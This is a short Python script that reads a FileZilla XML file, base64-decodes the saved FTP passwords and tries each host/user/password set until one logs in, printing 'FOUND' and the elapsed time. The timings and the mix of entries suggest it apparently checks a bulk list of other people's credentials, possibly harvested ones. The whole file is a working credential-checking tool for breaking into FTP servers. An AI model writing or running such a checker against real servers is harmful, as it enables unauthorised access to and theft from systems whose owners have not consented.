import xml.etree.ElementTree as ET
import base64
import ftplib
import time

root = ET.parse('C:/Users/inees/Downloads/FileZilla.xml').getroot()

ftp = ftplib.FTP()

start = time.time()
for server in root[0]:
    try:
        host = server[0].text
        port = server[1].text
        user = server[4].text
        passw = base64.b64decode(bytes(server[5].text, 'utf-8')).decode('utf-8')
        sv = server[10].text

        print("Trying user", user, "on host", host)
        try:
            ftp.connect(host, 21, timeout=0.2)
            ftp.login(user,passw)
            print("\t> FOUND")
            end = time.time()
            print("+ FOUND SERVER ON IP:", host)
            print("+ ELAPSED TIME:", end-start)
            break
        except Exception as e:
            print("\t> Not active")
    except Exception as e:
        # Characters not in utf-8 (arabic, etc)
        print("\t> Error")    
    
    